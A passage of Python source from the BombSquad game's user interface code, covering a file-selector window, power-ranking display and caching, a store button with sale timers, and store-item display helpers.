            transition='inRight', scale=2.23
            if gSmallUI else 1.4 if gMedUI else 1.0, stackOffset=(0, -35)
            if gSmallUI else(0, 0))
        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 42),
            size=(0, 0),
            color=gTitleColor, hAlign="center", vAlign="center", text=bs.Lstr(
                resource=self._r + '.titleFolderText')
            if(allowFolders and not validFileExtensions) else bs.Lstr(
                resource=self._r + '.titleFileText')
            if not allowFolders else bs.Lstr(
                resource=self._r + '.titleFileFolderText'), maxWidth=210)

        self._buttonWidth = 146
        self._cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(35 + xInset, self._height - 67),
            autoSelect=True, size=(self._buttonWidth, 50),
            label=bs.Lstr(resource='cancelText'),
            onActivateCall=self._cancel)
        bs.widget(edit=self._cancelButton, leftWidget=self._cancelButton)

        bColor = (0.6, 0.53, 0.63)

        self._backButton = bs.buttonWidget(
            parent=self._rootWidget, buttonType='square',
            position=(43 + xInset, self._height - 113),
            color=bColor, textColor=(0.75, 0.7, 0.8),
            enableSound=False, size=(55, 35),
            label='Back' if False else bs.getSpecialChar('leftArrow'),
            onActivateCall=self._onBackPress)

        self._folderTex = bs.getTexture('folder')
        self._folderColor = (1.1, 0.8, 0.2)
        self._fileTex = bs.getTexture('file')
        self._fileColor = (1, 1, 1)
        self._useFolderButton = None

        self._folderCenter = self._width*0.5+15

        self._folderIcon = bs.imageWidget(
            parent=self._rootWidget, size=(40, 40),
            position=(40, self._height - 117),
            texture=self._folderTex, color=self._folderColor)
        self._pathText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._folderCenter, self._height - 98),
            size=(0, 0),
            color=gTitleColor, hAlign="center", vAlign="center", text=self.
            _path, maxWidth=self._width * 0.9)

        self._scrollWidget = None

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        self._setPath(path)

    def _onUpPress(self):
        self._onEntryActivated('..')

    def _onBackPress(self):
        if len(self._recentPaths) > 1:
            bs.playSound(bs.getSound('swish'))
            self._recentPaths.pop()
            self._setPath(self._recentPaths.pop())
        else:
            pass
            bs.playSound(bs.getSound('error'))

    def _onFolderEntryActivated(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        if self._callback is not None:
            self._callback(self._path)

    def _onEntryActivated(self, entry):
        try:
            newPath = None
            if entry == '..':
                chunks = self._path.split('/')
                if len(chunks) > 1:
                    newPath = '/'.join(chunks[:-1])
                    if newPath == '':
                        newPath = '/'
                else:
                    bs.playSound(bs.getSound('error'))
            else:
                if self._path == '/':
                    testPath = self._path+entry
                else:
                    testPath = self._path+'/'+entry
                if os.path.isdir(bs.utf8(testPath)):
                    bs.playSound(bs.getSound('swish'))
                    newPath = testPath
                elif os.path.isfile(bs.utf8(testPath)):
                    if self._isValidFilePath(testPath):
                        bs.playSound(bs.getSound('swish'))
                        bs.containerWidget(
                            edit=self._rootWidget, transition='outRight')
                        if self._callback is not None:
                            self._callback(testPath)
                    else:
                        bs.playSound(bs.getSound('error'))
                else:
                    print ('Error: FileSelectorWindow found non-file/dir:',
                           testPath)
        except Exception:
            bs.printException('error on FileSelectorWindow._onEntryActivated')

        if newPath is not None:
            self._setPath(newPath)

    class _RefreshThread(threading.Thread):

        def __init__(self, path, callback):
            threading.Thread.__init__(self)
            self._callback = callback
            self._path = path

        def run(self):
            try:
                startTime = time.time()
                files = [bs.uni(f) for f in os.listdir(bs.utf8(self._path))]
                duration = time.time()-startTime
                minTime = 0.1
                # make sure this takes at least 1/10 second so the user
                # has time to see the selection highlight
                if duration < minTime:
                    time.sleep(minTime-duration)
                bs.callInGameThread(bs.Call(self._callback, fileNames=files))
            except Exception as e:
                # ignore permission-denied
                if 'Errno 13' not in str(e):
                    bs.printException()
                bs.callInGameThread(bs.Call(self._callback, error=str(e)))

    def _setPath(self, path, addToRecent=True):
        self._path = path
        if addToRecent:
            self._recentPaths.append(path)
        self._RefreshThread(path, self._refresh).start()

    def _refresh(self, fileNames=None, error=None):
        if not self._rootWidget.exists():
            return

        scrollWidgetSelected = (
            self._scrollWidget is None or self._rootWidget.getSelectedChild() ==
            self._scrollWidget)

        inTopFolder = (self._path == self._basePath)
        hideTopFolder = inTopFolder and self._showBasePath is False

        if hideTopFolder:
            folderName = ''
        elif self._path == '/':
            folderName = '/'
        else:
            folderName = os.path.basename(self._path)

        bColor = (0.6, 0.53, 0.63)
        bColorDisabled = (0.65, 0.65, 0.65)

        if len(self._recentPaths) < 2:
            bs.buttonWidget(
                edit=self._backButton, color=bColorDisabled,
                textColor=(0.5, 0.5, 0.5))
        else:
            bs.buttonWidget(edit=self._backButton, color=bColor,
                            textColor=(0.75, 0.7, 0.8))

        maxStrWidth = 300
        strWidth = min(maxStrWidth, bsInternal._getStringWidth(
            folderName, suppressWarning=True))
        bs.textWidget(edit=self._pathText, text=folderName,
                      maxWidth=maxStrWidth)
        bs.imageWidget(edit=self._folderIcon, position=(
            self._folderCenter-strWidth*0.5-40,
            self._height-117), opacity=0.0 if hideTopFolder else 1.0)

        if self._scrollWidget is not None:
            self._scrollWidget.delete()

        if self._useFolderButton is not None:
            self._useFolderButton.delete()
            bs.widget(edit=self._cancelButton, rightWidget=self._backButton)

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            position=((self._width-self._scrollWidth)*0.5,
                      self._height-self._scrollHeight-119),
            size=(self._scrollWidth,self._scrollHeight))

        if scrollWidgetSelected:
            bs.containerWidget(edit=self._rootWidget,
                               selectedChild=self._scrollWidget)

        # show error case..
        if error is not None:
            self._subContainer = bs.containerWidget(
                parent=self._scrollWidget,
                size=(self._scrollWidth, self._scrollHeight),
                background=False)
            bs.textWidget(
                parent=self._subContainer, color=(1, 1, 0, 1),
                text=error, maxWidth=self._scrollWidth * 0.9,
                position=(self._scrollWidth * 0.48, self._scrollHeight * 0.57),
                size=(0, 0),
                hAlign='center', vAlign='center')

        else:
            fileNames = [f for f in fileNames if not f.startswith('.')]
            fileNames.sort(key=lambda x: x[0].lower())

            entries = fileNames
            entryHeight = 35

            folderEntryHeight = 100
            showFolderEntry = False

            showUseFolderButton = (self._allowFolders and not inTopFolder)

            self._subContainerHeight = entryHeight*len(entries) + (
                folderEntryHeight if showFolderEntry else 0)
            v = self._subContainerHeight - (folderEntryHeight
                                            if showFolderEntry else 0)

            self._subContainer = bs.containerWidget(
                parent=self._scrollWidget,
                size=( self._scrollWidth, self._subContainerHeight),
                background=False)

            bs.containerWidget(edit=self._scrollWidget,
                               claimsLeftRight=False, claimsTab=False)
            bs.containerWidget(
                edit=self._subContainer, claimsLeftRight=False, claimsTab=False,
                selectionLoops=False, printListExitInstructions=False)
            bs.widget(edit=self._subContainer, upWidget=self._backButton)

            if showUseFolderButton:
                self._useFolderButton = b = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(
                        self._width - self._buttonWidth - 35 - self._xInset,
                        self._height - 67),
                    size=(self._buttonWidth, 50),
                    label=bs.Lstr(
                        resource=self._r + '.useThisFolderButtonText'),
                    onActivateCall=self._onFolderEntryActivated)
                bs.widget(edit=b, leftWidget=self._cancelButton,
                          downWidget=self._scrollWidget)
                bs.widget(edit=self._cancelButton, rightWidget=b)
                bs.containerWidget(edit=self._rootWidget, startButton=b)

            folderIconSize = 35
            for num, entry in enumerate(entries):
                c = bs.containerWidget(
                    parent=self._subContainer, position=(0, v - entryHeight),
                    size=(self._scrollWidth, entryHeight),
                    rootSelectable=True, background=False, clickActivate=True,
                    onActivateCall=bs.Call(self._onEntryActivated, entry))
                if num == 0:
                    bs.widget(edit=c, upWidget=self._backButton)
                isValidFilePath = self._isValidFilePath(entry)
                isDir = os.path.isdir(bs.utf8(self._path+'/'+entry))
                if isDir:
                    i = bs.imageWidget(
                        parent=c, size=(folderIconSize, folderIconSize),
                        position=(10, 0.5 * entryHeight - folderIconSize * 0.5),
                        drawController=c, texture=self._folderTex,
                        color=self._folderColor)
                else:
                    i = bs.imageWidget(
                        parent=c, size=(folderIconSize, folderIconSize),
                        position=(10, 0.5 * entryHeight - folderIconSize * 0.5),
                        opacity=1.0 if isValidFilePath else 0.5,
                        drawController=c, texture=self._fileTex,
                        color=self._fileColor)
                t = bs.textWidget(
                    parent=c, drawController=c, text=entry, hAlign='left',
                    vAlign='center',
                    position=(10 + folderIconSize * 1.05, entryHeight * 0.5),
                    size=(0, 0),
                    maxWidth=self._scrollWidth * 0.93 - 50, color=(1, 1, 1, 1)
                    if(isValidFilePath or isDir) else(0.5, 0.5, 0.5, 1))
                v -= entryHeight

    def _isValidFilePath(self, path):
        return any(path.lower().endswith(ext)
                   for ext in self._validFileExtensions)

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        if self._callback is not None:
            self._callback(None)


def _doLegacyProUpgradeMessage(tickets):
    with bs.Context('UI'):
        ConfirmWindow(
            bs.Lstr(
                resource='store.freeBombSquadProText',
                subs=[('${COUNT}', str(tickets))]),
            width=550, height=140, cancelButton=False)


gPowerRankingCache = {}


def _cachePowerRankingInfo(info):
    gPowerRankingCache['info'] = copy.deepcopy(info)


def _getCachedPowerRankingInfo():
    if 'info' in gPowerRankingCache:
        return gPowerRankingCache['info']
    else:
        return None


def _getPowerRankingPoints(data, subset=None):
    if data is None:
        return 0

    # if the data contains an achievement total, use that. otherwise calc
    # locally
    if data['at'] is not None:
        totalAchValue = data['at']
    else:
        totalAchValue = 0
        for ach in bsAchievement.gAchievements:
            if ach.isComplete():
                totalAchValue += ach.getPowerRankingValue()

    # return (data['a'] * data['am']

    trophiesTotal = (data['t0a'] * data['t0am']
                     + data['t0b'] * data['t0bm']
                     + data['t1'] * data['t1m']
                     + data['t2'] * data['t2m']
                     + data['t3'] * data['t3m']
                     + data['t4'] * data['t4m'])
    if subset == 'trophyCount':
        return (data['t0a']+data['t0b']+data['t1']
                +data['t2']+data['t3']+data['t4'])
    elif subset == 'trophies':
        return trophiesTotal
    elif subset is not None:
        raise Exception("invalid subset value: "+str(subset))

    if data['p']:
        proMult = 1.0 + float(bsInternal._getAccountMiscReadVal(
            'proPowerRankingBoost', 0.0)) * 0.01
    else:
        proMult = 1.0

    # for final value, apply our pro mult and activeness-mult
    return int(
        (totalAchValue + trophiesTotal) *
        (data['act'] if data['act'] is not None else 1.0) * proMult)


# cached info about individual tourneys
gTournamentInfo = {}
# the cached list of tourneys/challenges for our account
gAccountTournamentList = None
gAccountChallengeList = None


def _getCachedChallenge(challengeID):
    if gAccountChallengeList is None:
        return None
    if gAccountChallengeList['accountState'] != \
       bsInternal._getAccountStateNum():
        return None
    for c in gAccountChallengeList['challenges']:
        if c['challengeID'] == challengeID:
            return c
    return None


def _cacheTournamentInfo(info):
    for entry in info:
        cacheEntry = gTournamentInfo[entry['tournamentID']] = copy.deepcopy(
            entry)
        # also store the time we received this, so we can adjust
        # time-remaining values/etc
        cacheEntry['timeReceived'] = bs.getRealTime()
        cacheEntry['valid'] = True


def showSignInPrompt(accountType=None):

    if accountType == 'Google Play':
        ConfirmWindow(
            bs.Lstr(resource='notSignedInGooglePlayErrorText'),
            lambda: bsInternal._signIn('Google Play'),
            okText=bs.Lstr(resource='accountSettingsWindow.signInText'),
            width=460, height=130)
    else:
        ConfirmWindow(
            bs.Lstr(resource='notSignedInErrorText'),
            bs.Call(AccountWindow, modal=True, closeOnceSignedIn=True),
            okText=bs.Lstr(resource='accountSettingsWindow.signInText'),
            width=460, height=130)


def showGetTicketsPrompt():
    ConfirmWindow(
        bs.Lstr(
            translate=('serverResponses',
                       'You don\'t have enough tickets for this!')),
        bs.Call(GetTicketsWindow, modal=True),
        okText=bs.Lstr(resource='getTicketsWindow.titleText'),
        width=460, height=130)


class PowerRankingButton(object):

    def __init__(
            self, parent, position, size, scale, onActivateCall=None,
            transitionDelay=None, color=None, textColor=None,
            smoothUpdateDelay=None):
        if onActivateCall is None:
            onActivateCall = bs.WeakCall(self._defaultOnActivateCall)
        self._onActivateCall = onActivateCall

        if smoothUpdateDelay is None:
            smoothUpdateDelay = 1000
        self._smoothUpdateDelay = smoothUpdateDelay

        self._size = size
        self._scale = scale

        if color is None:
            color = (0.5, 0.6, 0.5)
        if textColor is None:
            textColor = (1, 1, 1)

        self._color = color
        self._textColor = textColor
        self._headerColor = (0.8, 0.8, 2.0)
        self._parent = parent
        self._button = bs.buttonWidget(
            parent=parent, size=size, label='', buttonType='square',
            scale=scale, autoSelect=True, onActivateCall=self._onActivate,
            transitionDelay=transitionDelay, color=color)

        self._titleText = bs.textWidget(
            parent=parent, size=(0, 0),
            drawController=self._button,
            hAlign='center', vAlign='center',
            maxWidth=size[0] * scale * 0.85,
            text=bs.Lstr(
                resource='league.leagueRankText',
                fallbackResource='coopSelectWindow.powerRankingText'),
            color=self._headerColor, flatness=1.0,
            shadow=1.0, scale=scale * 0.5,
            transitionDelay=transitionDelay)

        self._valueText = bs.textWidget(
            parent=parent, size=(0, 0),
            hAlign='center', vAlign='center', maxWidth=size[0] * scale * 0.85,
            text='-', drawController=self._button, big=True, scale=scale,
            transitionDelay=transitionDelay, color=textColor)

        self._smoothPercent = None
        self._percent = None
        self._smoothRank = None
        self._rank = None
        self._tickingNode = None
        self._smoothIncreaseSpeed = 1.0
        self._league = None

        # take note of our account state; we'll refresh later if this changes
        self._accountStateNum = bsInternal._getAccountStateNum()
        self._lastPowerRankingQueryTime = None
        self._doingPowerRankingQuery = False

        self.setPosition(position)

        self._bgFlash = False

        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

        # if we've got cached power-ranking data already, apply it..
        info = _getCachedPowerRankingInfo()
        if info is not None:
            self._updateForPowerRankingInfo(info)

    def _onActivate(self):
        bsInternal._incrementAnalyticsCount('League rank button press')
        self._onActivateCall()

    def __del__(self):
        if self._tickingNode is not None:
            self._tickingNode.delete()

    def _startSmoothUpdate(self):
        self._smoothUpdateTimer = bs.Timer(
            50, bs.WeakCall(self._smoothUpdate),
            repeat=True, timeType='real')

    def _smoothUpdate(self):
        try:

            if not self._button.exists():
                return

            if self._tickingNode is None:
                with bs.Context('UI'):
                    self._tickingNode = bs.newNode(
                        'sound',
                        attrs={'sound': bs.getSound('scoreIncrease'),
                               'positional': False})

            # if self._rank is None and self._percent is None:
            #     print 'fixme; have neither rank nor percent in _smoothUpdate'

            # if self._rank is not None or :
            self._bgFlash = (not self._bgFlash)
            colorUsed = (self._color[0]*2, self._color[1]*2,
                         self._color[2]*2) if self._bgFlash else self._color
            textColorUsed = (1, 1, 1) if self._bgFlash else self._textColor
            headerColorUsed = (1, 1, 1) if self._bgFlash else self._headerColor

            if self._rank is not None:
                self._smoothRank -= 1.0 * self._smoothIncreaseSpeed
                finished = (int(self._smoothRank) <= self._rank)
            elif self._smoothPercent is not None:
                self._smoothPercent += 1.0 * self._smoothIncreaseSpeed
                finished = (int(self._smoothPercent) >= self._percent)
            else:
                finished = True
            if finished:
                if self._rank is not None:
                    self._smoothRank = float(self._rank)
                elif self._percent is not None:
                    self._smoothPercent = float(self._percent)
                #self._smoothRank = float(self._rank)
                colorUsed = self._color
                textColorUsed = self._textColor
                self._smoothUpdateTimer = None
                if self._tickingNode is not None:
                    self._tickingNode.delete()
                    self._tickingNode = None
                bs.playSound(bs.getSound('cashRegister2'))
                diffText = bs.textWidget(
                    parent=self._parent, size=(0, 0),
                    hAlign='center', vAlign='center',
                    text='+'+self._improvementText+"!",
                    position=(self._position[0]+self._size[0]*0.5*self._scale,
                              self._position[1]+self._size[1]*-0.2*self._scale),
                    color=(0, 1, 0), flatness=1.0, shadow=0.0,
                    scale=self._scale*0.7)

                def safeDelete(widget):
                    if widget.exists():
                        widget.delete()
                bs.realTimer(2000, bs.Call(safeDelete, diffText))
            if self._rank is not None:
                status_text = bs.Lstr(
                    resource='numberText',
                    subs=[('${NUMBER}', str(int(self._smoothRank)))])
            elif self._smoothPercent is not None:
                status_text = str(int(self._smoothPercent))+'%'
            else:
                status_text = '-'
            bs.textWidget(edit=self._valueText,
                          text=status_text, color=textColorUsed)
            bs.textWidget(edit=self._titleText, color=headerColorUsed)

            bs.buttonWidget(edit=self._button, color=colorUsed)

        except Exception:
            bs.printException('error doing smooth update')
            self._smoothUpdateTimer = None

    def _updateForPowerRankingInfo(self, data):

        # if our button has died, ignore..
        if not self._button.exists():
            return

        inTop = True if (
            data is not None and data['rank'] is not None) else False
        doPercent = False
        if data is None or bsInternal._getAccountState() != 'SIGNED_IN':
            self._percent = self._rank = None
            status_text = '-'
        elif inTop:
            self._percent = None
            self._rank = data['rank']

            prevLeague = self._league
            self._league = data['l']

            # if this is the first set, league has changed, or rank has gotten
            # worse, snap the smooth value immediately
            if (self._smoothRank is None or prevLeague != self._league
                    or self._rank > int(self._smoothRank)):
                self._smoothRank = float(self._rank)
            status_text = bs.Lstr(
                resource='numberText',
                subs=[('${NUMBER}', str(int(self._smoothRank)))])
        else:
            try:
                if not data['scores'] or data['scores'][-1][1] <= 0:
                    self._percent = self._rank = None
                    status_text = '-'
                else:
                    ourPoints = _getPowerRankingPoints(data)
                    progress = float(ourPoints)/data['scores'][-1][1]
                    self._percent = int(progress*100.0)
                    self._rank = None
                    doPercent = True

                    prevLeague = self._league
                    self._league = data['l']

                    # if this is the first set, league has changed, or percent
                    # has decreased, snap the smooth value immediately
                    if (self._smoothPercent is None
                            or prevLeague != self._league
                            or self._percent < int(self._smoothPercent)):
                        self._smoothPercent = float(self._percent)
                    status_text = str(int(self._smoothPercent))+'%'

                    # print 'RUNNING INCREASE TEST'
                    # self._percent += random.randrange(40)

            except Exception:
                bs.printException('error updating power ranking')
                self._percent = self._rank = None
                status_text = '-'

        # if we're doing a smooth update ,set a timer..
        if self._rank is not None and int(self._smoothRank) != self._rank:
            self._improvementText = str(-(int(self._rank)
                                          -int(self._smoothRank)))
            diff = abs(self._rank - self._smoothRank)
            if diff > 100:
                self._smoothIncreaseSpeed = diff/80.0
            elif diff > 50:
                self._smoothIncreaseSpeed = diff/70.0
            elif diff > 25:
                self._smoothIncreaseSpeed = diff/55.0
            else:
                self._smoothIncreaseSpeed = diff/40.0
            self._smoothIncreaseSpeed = max(0.4, self._smoothIncreaseSpeed)
            bs.realTimer(self._smoothUpdateDelay, bs.WeakCall(
                self._startSmoothUpdate))

        if self._percent is not None and int(
                self._smoothPercent) != self._percent:
            self._improvementText = str(
                (int(self._percent)-int(self._smoothPercent)))
            diff = abs(self._percent - self._smoothPercent)
            self._smoothIncreaseSpeed = 0.3
            bs.realTimer(self._smoothUpdateDelay, bs.WeakCall(
                self._startSmoothUpdate))

        if doPercent:
            bs.textWidget(edit=self._titleText, text=bs.Lstr(
                resource='coopSelectWindow.toRankedText'))
        else:
            try:
                t = bs.Lstr(resource='league.leagueFullText', subs=[
                            ('${NAME}', bs.Lstr(translate=('leagueNames',
                                                           data['l']['n'])))])
                tColor = data['l']['c']
            except Exception:
                t = bs.Lstr(
                    resource='league.leagueRankText',
                    fallbackResource='coopSelectWindow.powerRankingText')
                tColor = gTitleColor
            bs.textWidget(edit=self._titleText, text=t, color=tColor)
        bs.textWidget(edit=self._valueText, text=status_text)

    def _onPowerRankingQueryResponse(self, data):
        self._doingPowerRankingQuery = False
        _cachePowerRankingInfo(data)
        # if data is not None:
        #     data['rank'] -= 10
        self._updateForPowerRankingInfo(data)

    def _update(self):
        curTime = bs.getRealTime()

        # if our account state has changed, refresh our UI
        accountStateNum = bsInternal._getAccountStateNum()
        if accountStateNum != self._accountStateNum:
            self._accountStateNum = accountStateNum
            # self._refresh()
            # and power ranking too...
            if not self._doingPowerRankingQuery:
                self._lastPowerRankingQueryTime = None

        # send off a new power-ranking query if its been long enough or whatnot..
        if not self._doingPowerRankingQuery and(
                self._lastPowerRankingQueryTime is None or curTime - self.
                _lastPowerRankingQueryTime > 30000):
            self._lastPowerRankingQueryTime = curTime
            self._doingPowerRankingQuery = True
            bsInternal._powerRankingQuery(
                callback=bs.WeakCall(self._onPowerRankingQueryResponse))

    def _defaultOnActivateCall(self):
        PowerRankingWindow(modal=True, originWidget=self._button)

    def setPosition(self, position):
        self._position = position
        if not self._button.exists():
            return
        bs.buttonWidget(edit=self._button, position=self._position)
        bs.textWidget(edit=self._titleText, position=(
            self._position[0]+self._size[0]*0.5*self._scale,
            self._position[1]+self._size[1]*0.82*self._scale))
        bs.textWidget(edit=self._valueText, position=(
            self._position[0]+self._size[0]*0.5*self._scale,
            self._position[1]+self._size[1]*0.36*self._scale))

    def getButtonWidget(self):
        return self._button


class StoreButton(object):

    def __init__(
            self, parent, position, size, scale, onActivateCall=None,
            transitionDelay=None, color=None, textColor=None, showTickets=False,
            buttonType=None, saleScale=1.0):
        self._position = position
        self._size = size
        self._scale = scale

        if onActivateCall is None:
            onActivateCall = bs.WeakCall(self._defaultOnActivateCall)
        self._onActivateCall = onActivateCall

        self._button = bs.buttonWidget(
            parent=parent, size=size, label=''
            if showTickets else bs.Lstr(resource='storeText'), scale=scale,
            autoSelect=True, onActivateCall=self._onActivate,
            transitionDelay=transitionDelay, color=color, buttonType=buttonType)

        if showTickets:
            self._titleText = bs.textWidget(
                parent=parent,
                position=(position[0] + size[0] * 0.5 * scale, position[1] +
                          size[1] * 0.65 * scale),
                size=(0, 0),
                hAlign='center', vAlign='center', maxWidth=size[0] * scale *
                0.65, text=bs.Lstr(resource='storeText'),
                drawController=self._button, scale=scale,
                transitionDelay=transitionDelay, color=textColor)
            self._ticketText = bs.textWidget(
                parent=parent, size=(0, 0),
                hAlign='center', vAlign='center', maxWidth=size[0]*scale*0.85,
                text='', color=(0.2, 1.0, 0.2), flatness=1.0, shadow=0.0,
                scale=scale*0.6, transitionDelay=transitionDelay)
        else:
            self._titleText = None
            self._ticketText = None

        self._circleRad = 12*scale
        self._availablePurchaseBacking = bs.imageWidget(
            parent=parent, color=(1, 0, 0),
            drawController=self._button,
            size=(2.2 * self._circleRad, 2.2 * self._circleRad),
            texture=bs.getTexture('circleShadow'),
            transitionDelay=transitionDelay)
        self._availablePurchaseText = bs.textWidget(
            parent=parent, size=(0, 0),
            hAlign='center', vAlign='center', text='',
            drawController=self._button, color=(1, 1, 1),
            flatness=1.0, shadow=1.0, scale=0.6 * scale,
            maxWidth=self._circleRad * 1.4, transitionDelay=transitionDelay)

        self._saleCircleRad = 18*scale*saleScale
        self._saleBacking = bs.imageWidget(
            parent=parent, color=(0.5, 0, 1.0),
            drawController=self._button,
            size=(2 * self._saleCircleRad, 2 * self._saleCircleRad),
            texture=bs.getTexture('circleZigZag'),
            transitionDelay=transitionDelay)
        self._saleTitleText = bs.textWidget(
            parent=parent, size=(0, 0),
            hAlign='center', vAlign='center', drawController=self._button,
            color=(0, 1, 0),
            flatness=1.0, shadow=0.0, scale=0.5 * scale * saleScale,
            maxWidth=self._saleCircleRad * 1.5, transitionDelay=transitionDelay)
        self._saleTimeText = bs.textWidget(
            parent=parent, size=(0, 0),
            hAlign='center', vAlign='center', drawController=self._button,
            color=(0, 1, 0),
            flatness=1.0, shadow=0.0, scale=0.4 * scale * saleScale,
            maxWidth=self._saleCircleRad * 1.5, transitionDelay=transitionDelay)

        self.setPosition(position)
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            repeat=True, timeType='real')
        self._update()

    def _onActivate(self):
        bsInternal._incrementAnalyticsCount('Store button press')
        self._onActivateCall()

    def setPosition(self, position):
        self._position = position
        self._circleCenter = (
            position[0]+0.1*self._size[0]*self._scale,
            position[1]+self._size[1]*self._scale*0.8)
        self._saleCircleCenter = (
            position[0]+0.07*self._size[0]*self._scale,
            position[1]+self._size[1]*self._scale*0.8)

        if not self._button.exists():
            return
        bs.buttonWidget(edit=self._button, position=self._position)
        if self._titleText is not None:
            bs.textWidget(
                edit=self._titleText,
                position=(
                    self._position[0] + self._size[0] * 0.5 * self._scale,
                    self._position[1] + self._size[1] * 0.65 * self._scale))
        if self._ticketText is not None:
            bs.textWidget(
                edit=self._ticketText,
                position=(position[0] + self._size[0] * 0.5 * self._scale,
                          position[1] + self._size[1] * 0.28 * self._scale),
                size=(0, 0))
        bs.imageWidget(edit=self._availablePurchaseBacking,
                       position=(self._circleCenter[0] - self._circleRad * 1.02,
                                 self._circleCenter[1] - self._circleRad * 1.13))
        bs.textWidget(edit=self._availablePurchaseText,
                      position=self._circleCenter)

        bs.imageWidget(edit=self._saleBacking, position=(
            self._saleCircleCenter[0]-self._saleCircleRad,
            self._saleCircleCenter[1]-self._saleCircleRad))
        bs.textWidget(edit=self._saleTitleText, position=(
            self._saleCircleCenter[0],
            self._saleCircleCenter[1]+self._saleCircleRad*0.3))
        bs.textWidget(edit=self._saleTimeText, position=(
            self._saleCircleCenter[0],
            self._saleCircleCenter[1]-self._saleCircleRad*0.3))

    def _defaultOnActivateCall(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        StoreWindow(modal=True, originWidget=self._button)

    def getButtonWidget(self):
        return self._button

    def _update(self):
        if not self._button.exists():
            return  # our instance may outlive our UI objects..

        #print 'UPDATING STORE BUTTON'
        if self._ticketText is not None:
            if bsInternal._getAccountState() == 'SIGNED_IN':
                s = bs.getSpecialChar(
                    'ticket')+str(bsInternal._getAccountTicketCount())
            else:
                s = '-'
            bs.textWidget(edit=self._ticketText, text=s)
        availablePurchases = _getAvailablePurchaseCount()

        # old pro sale stuff..
        saleTime = _getAvailableSaleTime('extras')

        # ..also look for new style sales
        if saleTime is None:
            import datetime
            salesRaw = bsInternal._getAccountMiscReadVal('sales', {})
            saleTimes = []
            try:
                # look at the current set of sales; filter any with time
                # remaining that we don't own
                for saleItem, saleInfo in salesRaw.items():
                    if not bsInternal._getPurchased(saleItem):
                        toEnd = (datetime.datetime.utcfromtimestamp(
                            saleInfo['e']) - datetime.datetime.utcnow())\
                            .total_seconds()
                        if toEnd > 0:
                            saleTimes.append(toEnd)
            except Exception:
                bs.printException("Error parsing sales")
            if saleTimes:
                saleTime = int(min(saleTimes)*1000)

        if saleTime is not None:
            bs.textWidget(
                edit=self._saleTitleText, text=bs.Lstr(
                    resource='store.saleText'))
            bs.textWidget(
                edit=self._saleTimeText, text=bsUtils.getTimeString(
                    saleTime, centi=False))
            bs.imageWidget(edit=self._saleBacking, opacity=1.0)
            bs.imageWidget(edit=self._availablePurchaseBacking, opacity=1.0)
            bs.textWidget(edit=self._availablePurchaseText, text='')
            bs.imageWidget(edit=self._availablePurchaseBacking, opacity=0.0)
        else:
            bs.imageWidget(edit=self._saleBacking, opacity=0.0)
            bs.textWidget(edit=self._saleTimeText, text='')
            bs.textWidget(edit=self._saleTitleText, text='')
            if availablePurchases > 0:
                bs.textWidget(
                    edit=self._availablePurchaseText,
                    text=str(availablePurchases))
                bs.imageWidget(edit=self._availablePurchaseBacking, opacity=1.0)
            else:
                bs.textWidget(edit=self._availablePurchaseText, text='')
                bs.imageWidget(edit=self._availablePurchaseBacking, opacity=0.0)

_gStoreLayout = None
_gStoreItems = None

def _getStoreItem(item):
    return _getStoreItems()[item]

# given an item-info as returned from _getStoreItem, returns a translated name

def _getStoreItemNameTranslated(itemName):
    itemInfo = _getStoreItem(itemName)
    if itemName.startswith('characters.'):
        return bs.Lstr(translate=('characterNames', itemInfo['character']))
    elif itemName in ['upgrades.pro', 'pro']:
        return bs.Lstr(
            resource='store.bombSquadProNameText',
            subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))])
    elif itemName.startswith('maps.'):
        mapType = itemInfo['mapType']
        # return bsMap.getLocalizedMapName(mapType.name)
        return bsMap.getMapDisplayString(mapType.name)
    elif itemName.startswith('games.'):
        gameType = itemInfo['gameType']
        # return gameType.getNameLocalized()
        return gameType.getDisplayString()
    elif itemName.startswith('icons.'):
        return bs.Lstr(resource='editProfileWindow.iconText')
    else:
        raise Exception('unrecognized item: '+itemName)


def _instantiateStoreItemDisplay(
        itemName, item, parentWidget, bPos, bWidth, bHeight, buttonOffsetH=0,
        bOffsH2=0, bOffsV2=0, delay=0, button=True):
    itemInfo = _getStoreItem(itemName)
    title = 'untitled'
    titleV = 0.24
    priceV = 0.145
    baseTextScale = 1.0

    item['name'] = title = _getStoreItemNameTranslated(itemName)

    if button:
        item['button'] = b = bs.buttonWidget(parent=parentWidget, position=bPos,
                                             transitionDelay=delay,
                                             showBufferTop=76.0,
                                             enableSound=False,
                                             buttonType='square',
                                             size=(bWidth, bHeight),
                                             autoSelect=True,
                                             label='')
        bs.widget(edit=b, showBufferBottom=76.0)
    else:
        b = None

    bOffsX = -0.015*bWidth
    checkPos = 0.76

    if itemName.startswith('characters.'):
        character = bsSpaz.appearances[itemInfo['character']]
        tintColor = (
            itemInfo['color']
            if 'color' in itemInfo else character.defaultColor
            if character.defaultColor is not None else(1, 1, 1))
        tint2Color = (
            itemInfo['highlight']
            if 'highlight' in itemInfo else character.defaultHighlight
            if character.defaultHighlight is not None else(1, 1, 1))
        iconTex = character.iconTexture
        tintTex = character.iconMaskTexture
        titleV = 0.255
        priceV = 0.145
    elif itemName in ['upgrades.pro', 'pro']:
        baseTextScale = 0.6
        titleV = 0.85
        priceV = 0.15
    elif itemName.startswith('maps.'):
        mapType = itemInfo['mapType']
        texName = mapType.getPreviewTextureName()
        titleV = 0.312
        priceV = 0.17

    elif itemName.startswith('games.'):
        gameType = itemInfo['gameType']
        modes = []
        if gameType.supportsSessionType(bs.CoopSession):
            modes.append(bs.Lstr(resource='playModes.coopText'))
        if gameType.supportsSessionType(bs.TeamsSession):
            modes.append(bs.Lstr(resource='playModes.teamsText'))
        if gameType.supportsSessionType(bs.FreeForAllSession):
            modes.append(bs.Lstr(resource='playModes.freeForAllText'))

        if len(modes) == 3:
            modes = bs.Lstr(
                value='${A}, ${B}, ${C}',
